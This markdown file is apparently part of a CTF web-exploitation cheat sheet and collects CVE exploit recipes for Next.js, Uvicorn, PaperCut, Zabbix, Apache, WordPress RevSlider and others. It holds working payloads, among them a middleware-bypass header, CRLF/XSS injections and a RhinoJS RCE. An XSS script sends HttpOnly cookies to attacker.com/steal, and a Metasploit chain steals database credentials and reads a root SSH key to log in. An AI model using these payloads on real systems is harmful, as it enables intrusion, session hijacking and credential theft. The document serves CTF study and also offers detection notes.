# CTF Web - CVEs & Browser Vulnerabilities

Specific CVEs and vulnerability patterns. For Node.js CVEs (flatnest, Happy-DOM), see [node-and-prototype.md](node-and-prototype.md). For JWT algorithm confusion, see [auth-and-access.md](auth-and-access.md).

## Table of Contents
- [CVE-2025-29927: Next.js Middleware Bypass](#cve-2025-29927-nextjs-middleware-bypass)
- [CVE-2025-0167: Curl .netrc Credential Leakage](#cve-2025-0167-curl-netrc-credential-leakage)
- [Uvicorn CRLF Injection (Unpatched N-Day)](#uvicorn-crlf-injection-unpatched-n-day)
- [Python urllib Scheme Validation Bypass (0-Day)](#python-urllib-scheme-validation-bypass-0-day)
- [Chrome Referrer Leak via Link Header (2025)](#chrome-referrer-leak-via-link-header-2025)
- [TCP Packet Splitting (Firewall Bypass)](#tcp-packet-splitting-firewall-bypass)
- [Puppeteer/Chrome JavaScript Bypass](#puppeteerchrome-javascript-bypass)
- [Python python-dotenv Injection](#python-python-dotenv-injection)
- [HTTP Request Splitting via RFC 2047](#http-request-splitting-via-rfc-2047)
- [Waitress WSGI Cookie Exfiltration](#waitress-wsgi-cookie-exfiltration)
- [Deno Import Map Hijacking](#deno-import-map-hijacking)
- [CVE-2025-8110: Gogs Symlink RCE](#cve-2025-8110-gogs-symlink-rce)
- [CVE-2021-22204: ExifTool DjVu Perl Injection](#cve-2021-22204-exiftool-djvu-perl-injection)
- [Broken Auth via Truthy Hash Check (0xFun 2026)](#broken-auth-via-truthy-hash-check-0xfun-2026)
- [AAEncode/JJEncode JS Deobfuscation (0xFun 2026)](#aaencodejjencode-js-deobfuscation-0xfun-2026)
- [Protocol Multiplexing — SSH+HTTP on Same Port (0xFun 2026)](#protocol-multiplexing--sshhttp-on-same-port-0xfun-2026)
- [CVE-2024-28184: WeasyPrint Attachment SSRF / File Read](#cve-2024-28184-weasyprint-attachment-ssrf--file-read)
- [CVE-2025-55182 / CVE-2025-66478: React Server Components Flight Protocol RCE](#cve-2025-55182--cve-2025-66478-react-server-components-flight-protocol-rce)
- [CVE-2024-45409: Ruby-SAML XPath Digest Smuggling (Barrier HTB)](#cve-2024-45409-ruby-saml-xpath-digest-smuggling-barrier-htb)
- [CVE-2023-27350: PaperCut NG Authentication Bypass + RCE (Bamboo HTB)](#cve-2023-27350-papercut-ng-authentication-bypass--rce-bamboo-htb)
- [CVE-2024-22120: Zabbix Time-Based Blind SQLi (Watcher HTB)](#cve-2024-22120-zabbix-time-based-blind-sqli-watcher-htb)
- [CVE-2012-0053: Apache HttpOnly Cookie Leak via 400 Bad Request (RC3 CTF 2016)](#cve-2012-0053-apache-httponly-cookie-leak-via-400-bad-request-rc3-ctf-2016)
- [CVE-2014-9734: WordPress RevSlider Upload + MySQL load_file() SSH Pivot (TAMUctf 2019)](#cve-2014-9734-wordpress-revslider-upload--mysql-load_file-ssh-pivot-tamuctf-2019)
- [Detection Checklist](#detection-checklist)

---

## CVE-2025-29927: Next.js Middleware Bypass

**Affected:** Next.js < 14.2.25, also 15.x < 15.2.3

```http
GET /protected/endpoint HTTP/1.1
Host: target
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

Bypasses authentication middleware, accesses protected endpoints, admin-only routes.

**Chaining with SSRF (Note Keeper, Pragyan 2026):** After middleware bypass, inject `Location` header to trigger Next.js internal fetch to arbitrary URL:
```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     -H "Location: http://backend:4000/flag" \
     https://target/api/login
```
Next.js processes the `Location` header and fetches the specified URL internally, enabling SSRF to internal services.

---

## CVE-2025-0167: Curl .netrc Credential Leakage

Server A (in `.netrc`) redirects to server B → curl sends credentials to B if B responds with `401 + WWW-Authenticate: Basic`

```python
@app.route('/<path:path>')
def leak(path):
    return '', 401, {'WWW-Authenticate': 'Basic realm="leak"'}
```

---

## Uvicorn CRLF Injection (Unpatched N-Day)

**Affected:** Uvicorn (FastAPI default ASGI server) — reported but ignored.

Uvicorn doesn't sanitize CRLF in response headers. Enables:
1. **CSP bypass** — inject headers that break Content-Security-Policy
2. **Cache poisoning** — break header/body boundary, Nginx caches attacker content
3. **XSS** — `\r\n\r\n` terminates headers, rest becomes response body

```python
payload = {"headers": {"lol\r\n\r\n<script>evil()</script>": "x"}}
requests.get(f'{HOST}/api/health', params={"test": json.dumps(payload)})
```

**Detection:** FastAPI/Uvicorn backend + endpoint reflecting user input in response headers.

---

## Python urllib Scheme Validation Bypass (0-Day)

**Affected:** Python `urllib` — `urlsplit` vs `urlretrieve` inconsistency.

`urlsplit("<URL:http://attacker.com/evil>").scheme` returns `""` (empty), but `urlretrieve` still fetches it as HTTP.

```python
# App blocks http/https via urlsplit:
parsed = urlsplit(user_url)
if parsed.scheme in ['http', 'https']: raise Exception("Blocked")
# Bypass: <URL:http://attacker.com/malicious.so>
# Also: %0ahttp://attacker.com/malicious.so (newline prefix)
```

Legacy `<URL:...>` format from RFC 1738.

---

## Chrome Referrer Leak via Link Header (2025)

```http
HTTP/1.1 200 OK
Link: <https://exfil.com/log>; rel="preload"; as="image"; referrerpolicy="unsafe-url"
```

Chrome fetches linked resource with full referrer URL → leaks tokens from `/auth/callback?token=secret`.

---

## TCP Packet Splitting (Firewall Bypass)

Split blocked keywords across TCP packet boundaries:
```python
s = socket.socket(); s.connect((host, port))
s.send(b"GET /fla")
s.send(b"g.html HTTP/1.1\r\nHost: 127.0.0.1\r\nRange: bytes=135-\r\n\r\n")
```

---

## Puppeteer/Chrome JavaScript Bypass

`page.setJavaScriptEnabled(false)` only affects current context. `window.open()` from iframe → new window has JS enabled.

---

## Python python-dotenv Injection

Escape sequences and newlines in values:
```text
backup_server=x\'\nEVIL_VAR=malicious_value\n\'
```
Chain with `PYTHONWARNINGS=ignore::antigravity.Foo::0` + `BROWSER=/bin/sh -c "cat /flag" %s` for RCE.
See ctf-misc/pyjails.md for PYTHONWARNINGS technique details.

---

## HTTP Request Splitting via RFC 2047

CherryPy decodes RFC 2047 headers → CRLF injection:
```python
payload = b"value\r\n\r\nGET /second HTTP/1.1\r\nHost: backend\r\n"
encoded = f"=?ISO-8859-1?B?{base64.b64encode(payload).decode()}?="
```

---

## Waitress WSGI Cookie Exfiltration

Invalid HTTP method echoed in error response. CRLF splits request, cookie value lands at method position, error echoes it.

---

## Deno Import Map Hijacking

Deno v1.18+ auto-discovers `deno.json`. Via prototype pollution:
```javascript
({}).__proto__["deno.json"] = '{"importMap": "https://evil.com/map.json"}'
```

---

## CVE-2025-8110: Gogs Symlink RCE

See [server-side.md](server-side.md) for full details.

---

## CVE-2021-22204: ExifTool DjVu Perl Injection

**Affected:** ExifTool ≤ 12.23. DjVu ANTa annotation chunk parsed with Perl `eval`. Craft minimal DjVu with injected metadata to achieve RCE on any endpoint processing images with ExifTool.

See [server-side-advanced.md](server-side-advanced.md#exiftool-cve-2021-22204--djvu-perl-injection-0xfun-2026) for full exploit code.

---

## Broken Auth via Truthy Hash Check (0xFun 2026)

**Pattern:** `sha256().hexdigest()` returns non-empty string (truthy in Python). Auth function checks `if sha256(...)` which is always True — the actual hash comparison is missing entirely.

**Detection:** Look for `if hash_function(...)` instead of `if hash_function(...) == expected`.

---

## AAEncode/JJEncode JS Deobfuscation (0xFun 2026)

JS obfuscation that ultimately calls `Function(...)()`. Override `Function.prototype.constructor` to intercept:
```javascript
Function.prototype.constructor = function(code) {
    console.log("Decoded:", code);
    return function() {};
};
```

**AAEncode:** Japanese Unicode characters. **JJEncode:** `$=~[]` pattern. Both reduce to `Function(decoded_string)()`.

---

## Protocol Multiplexing — SSH+HTTP on Same Port (0xFun 2026)

Server distinguishes SSH from HTTP by first bytes. When challenge mentions "fewer ports", try `ssh -p <http_port> user@host`. Credentials may be hidden in HTML comments.

---

## CVE-2024-28184: WeasyPrint Attachment SSRF / File Read

**Affected:** WeasyPrint (multiple versions)

**Vulnerability:** WeasyPrint processes `<a rel="attachment">` and `<link rel="attachment">` tags, fetching referenced URLs and embedding results as PDF attachments. Internal header checks (e.g., `X-Fetcher`) are NOT applied to attachment fetches.

**Attack vectors:**
1. **SSRF:** `<a rel="attachment" href="http://127.0.0.1/admin/flag">` -- fetches from localhost, bypasses IP restrictions
2. **Local file read:** `<link rel="attachment" href="file:///flag.txt">` -- embeds local files in PDF
3. **Blind oracle:** Attachment only appears in PDF if target returns 200 -- use presence of `/Type /EmbeddedFile` as boolean oracle

**Extraction:**
```bash
pdfdetach -list output.pdf        # List embedded files
pdfdetach -save 1 -o flag.txt output.pdf  # Extract
```

**Detection:** URL-to-PDF conversion feature, WeasyPrint in `requirements.txt` or `Pipfile`.

---

## CVE-2025-55182 / CVE-2025-66478: React Server Components Flight Protocol RCE

**Affected:** React Server Components / Next.js (Flight protocol deserialization). A crafted fake Flight chunk exploits the constructor chain (`constructor → constructor → Function`) for arbitrary server-side JavaScript execution. Identify via `Next-Action` + `Accept: text/x-component` headers. Also reported as CVE-2025-66478 with an alternate prototype chain variant (`__proto__:then` instead of `constructor:constructor`).

See [server-side-advanced-4.md](server-side-advanced-4.md#react-server-components-flight-protocol-rce-ehax-2026) for full exploit chain.

---

## CVE-2024-45409: Ruby-SAML XPath Digest Smuggling (Barrier HTB)

**Affected:** GitLab 17.3.2 (ruby-saml library)

Exploits XPath ambiguity in ruby-saml's signature verification to forge SAML (Security Assertion Markup Language) assertions claiming arbitrary user identity.

**Attack chain:**
1. Extract IdP (Identity Provider) metadata signature from the legitimate SAML response
2. Craft assertion claiming target user (e.g., `akadmin`)
3. Set assertion ID to match metadata reference URI
4. Compute correct digest and place in `StatusDetail` element — XPath finds this smuggled digest instead of the original
5. Submit forged response to `/users/auth/saml/callback`

**Detection:** GitLab < 17.3.3 with SAML SSO enabled.

---

## CVE-2023-27350: PaperCut NG Authentication Bypass + RCE (Bamboo HTB)

**Affected:** PaperCut NG < 22.0.9 (CVSS 9.8)

**Attack chain:**
1. Hit `/app?service=page/SetupCompleted` for unauthenticated admin session
2. Enable `print-and-device.script.enabled`, disable `print.script.sandboxed` via Config Editor
3. Inject RhinoJS script in printer settings for RCE:
```javascript
java.lang.Runtime.getRuntime().exec(["/bin/bash", "-c", "CMD"])
```
4. Exfiltrate output via HTTP callback with base64 encoding
5. Access internal services via Squid proxy:
```bash
curl -x http://TARGET:3128 http://127.0.0.1:9191/app
```

**Key insight:** The SetupCompleted endpoint grants full admin access without credentials. Chain with Squid proxy to reach internal services.

---

## CVE-2024-22120: Zabbix Time-Based Blind SQLi (Watcher HTB)

**Affected:** Zabbix (audit log functionality via trapper port 10051)

Exploits unsanitized `clientip` field in Zabbix trapper protocol to achieve time-based blind SQL injection, then escalates to RCE via Zabbix API.

**Attack chain:**
1. Log in to Zabbix frontend as guest, decode base64 cookie to extract `sessionid`
2. Send crafted `clientip` field via trapper port 10051 for time-based blind SQLi
3. Extract admin session ID character-by-character via sleep timing
4. Authenticate to Zabbix API with stolen admin session
5. Achieve RCE via `script.create` + `script.execute` API calls

**Key insight:** `\r` (carriage return) in exploit script output can leave visual artifacts. Verify extracted session ID is exactly 32 hex characters before using it.

**Detection:** Zabbix with trapper port 10051 exposed. Audit log functionality enabled.

---

## CVE-2012-0053: Apache HttpOnly Cookie Leak via 400 Bad Request (RC3 CTF 2016)

Apache 2.2.x (before 2.2.22) reflects cookies in 400 Bad Request error pages, bypassing HttpOnly flag protection. Chain with XSS to exfiltrate session cookies.

```javascript
// XSS payload to trigger Apache 400 error and leak HttpOnly cookies
// Works on Apache 2.2.0 - 2.2.21

// Step 1: Inflate cookie header to exceed Apache's limit (triggers 400)
var xhr = new XMLHttpRequest();
document.cookie = "padding=" + "A".repeat(4000);

// Step 2: Request to the vulnerable Apache server
xhr.open("GET", "http://target:8080/", true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        // 400 response body contains ALL cookies including HttpOnly ones
        var cookies = xhr.responseText.match(/Cookie:.*$/m);
        // Exfiltrate to attacker
        new Image().src = "http://attacker.com/steal?c=" + encodeURIComponent(cookies);
    }
};
xhr.send();
```

**Key insight:** Apache 2.2.x before 2.2.22 included the full Cookie header in 400 Bad Request HTML responses, including HttpOnly cookies. Combined with XSS on the same origin, this defeats HttpOnly protection entirely. Check server version headers for vulnerable Apache instances.

---

## CVE-2014-9734: WordPress RevSlider Upload + MySQL load_file() SSH Pivot (TAMUctf 2019)

**Affected:** WordPress Slider Revolution (RevSlider) plugin `<= 3.0.95` — arbitrary file upload via `update_plugin` admin-ajax action, exploitable unauthenticated.

**Version fingerprint:** Fetch `/wp-content/plugins/revslider/release_log.txt` — the plugin writes its version there even when the admin UI is locked down.

```bash
# 1. RCE via RevSlider upload (Metasploit module)
msfconsole -q -x "use exploit/unix/webapp/wp_revslider_upload_execute; \
  set RHOSTS 172.30.0.3; set LHOST tun0; exploit"

# 2. From the meterpreter shell, steal DB creds from wp-config.php
cat /var/www/wp-config.php | grep -E "DB_(NAME|USER|PASSWORD|HOST)"
# -> DB_USER='wordpress', DB_PASSWORD='0NYa6PBH52y86C', DB_HOST='172.30.0.2'

# 3. Pivot: connect as the DB user and read any world-readable file with load_file()
mysql -h 172.30.0.2 -u wordpress --password='0NYa6PBH52y86C' \
      -e "SELECT load_file('/backup/id_rsa')"
#   (requires FILE privilege, granted to the WP user on older default stacks)

# 4. Use the exfiltrated key to SSH into the target as root
chmod 400 rsa.key
ssh -i rsa.key root@172.30.0.3
```

**Key insight:** RCE via plugin upload is rarely the end — extract `wp-config.php` DB creds, connect to the database, and `load_file()` to read any world-readable file (private SSH keys under `/backup/`, `/root/.ssh/`, `/home/*/.ssh/`, CI secrets, etc.), then SSH pivot to the real target box. The WP user almost always has FILE privilege on CTF setups. Exploits to chain with a single file-upload: `wp_revslider_upload_execute`, `wp_admin_shell_upload`, `wp_asset_manager_upload_exec`, `wp_symposium_shell_upload`.

**References:** TAMUctf 2019 — Wordpress, writeup 13593. Rapid7 module `exploit/unix/webapp/wp_revslider_upload_execute`.

---

## Detection Checklist

1. **Framework versions** in `package.json`, `requirements.txt`, `Dockerfile`
2. **ASGI/WSGI server** (Uvicorn, Waitress) for CRLF/header issues
3. **curl usage** with `.netrc` or redirect handling
4. **Firewall/WAF** inspection patterns (TCP packet splitting)
5. **dotenv** or environment variable handling
6. **urllib** scheme validation (check for `<URL:...>` bypass)
7. **Node.js libraries** — see [node-and-prototype.md](node-and-prototype.md) for full list
8. **GitLab with SAML SSO** — check version for ruby-saml CVE-2024-45409
9. **PaperCut NG** — check for `/app?service=page/SetupCompleted` unauthenticated access
10. **Zabbix trapper port** (10051) — audit log SQLi via `clientip` field
